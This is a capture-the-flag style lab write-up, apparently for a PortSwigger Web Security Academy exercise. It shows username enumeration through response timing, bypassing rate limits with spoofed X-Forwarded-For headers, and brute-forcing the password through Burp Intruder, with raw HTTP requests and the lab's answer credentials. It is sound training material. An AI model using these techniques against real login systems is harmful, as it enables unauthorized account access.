@@ -1,0 +1,94 @@
+#+title: Username enumeration via response timing
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+
+* Table of Contents :toc:
+- [[#lab-contains][Lab contains]]
+- [[#end-goal][End goal]]
+- [[#enumeration-of-username][Enumeration of username]]
+- [[#enumeration-of-password][Enumeration of password]]
+- [[#solve-the-lab][Solve the lab]]
+
+* Lab contains
++ Vulnerable to username enumeration using it's response time
++ Test credential
+  + username = ~wiener~
+  + password = ~peter~
+* End goal
++ Enumerate for valid username
++ Enumerate for valid password
++ Login with those credential and access their account
+
+* DONE Enumeration of username
+CLOSED: [2023-07-31 Mon 20:22]
++ Login with invalid credential and send that request to burp repeater
++ Send multiple request with multiple value from repeater and observe
++ See that ip is being block due to many invalid attempts
++ [[./assets/screenshots/lab5-ip-blocked.png]]
++ Have to spoof the ip with ~X-Forwarded-For~
++ Now send this request to intruder and select attack type to ~Pitchfork~  to add payload on ~X-Forwarded-For~ value and username.
++ Add payload for ~X-Forwarded-For~ numbers value and for ~username~ add payload from given username wordlist
+  #+begin_src shell
+    POST /login HTTP/2
+    Host: 0ad400d904ca330284f5bebe0048003e.web-security-academy.net
+    Cookie: session=79bCYHKeRsXH03mh5nKOAkC86RBdWuz1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 27
+    Origin: https://0ad400d904ca330284f5bebe0048003e.web-security-academy.net
+    Dnt: 1
+    Referer: https://0ad400d904ca330284f5bebe0048003e.web-security-academy.net/login
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Sec-Gpc: 1
+    Te: trailers
+    X-Forwarded-For: 4.5.3.§2§
+
+    username=§test§&password=23xQMvNgryDZK9vQPhqy2FswjHY4F7fQFbtUqRBh9D9PCvNKAUYefY5Q9YENKN3bAAtYTjPnQT6bg9bA8eFMTPAhetywSHPx2wXC
+#+end_src
+
++ After finish the attack select ~Response received~ and ~Response completed~ from ~Column~ tab to measure response time of each payload
++ Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username
++ After running few times one perticular payload is taking longer time than other and that is ~albuquerque~
++ [[./assets/screenshots/lab5-user-enum.png]]
+* DONE Enumeration of password 
+CLOSED: [2023-07-31 Mon 20:29]
++ Now send a request with username ~albuquerque~ and send it to intruder to brute-force the password
+  #+begin_src shell
+    POST /login HTTP/2
+    Host: 0ad400d904ca330284f5bebe0048003e.web-security-academy.net
+    Cookie: session=79bCYHKeRsXH03mh5nKOAkC86RBdWuz1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 34
+    Origin: https://0ad400d904ca330284f5bebe0048003e.web-security-academy.net
+    Dnt: 1
+    Referer: https://0ad400d904ca330284f5bebe0048003e.web-security-academy.net/login
+    Upgrade-Insecure-Requests: 1
+    Sec-Fetch-Dest: document
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Sec-Gpc: 1
+    Te: trailers
+    X-Forwarded-For: 5.7.2.§2§
+
+    username=albuquerque&password=§test§
+#+end_src
++ After finishing attack look for status code ~302~
++ Here is one payload that gives ~302~ it is our password for username ~albuquerque~
++ [[./assets/screenshots/lab5-enum-password.png]]
+
+
+* Solve the lab
+We enumrate both username and password
+- username : ~albuquerque~
+- password : ~master~
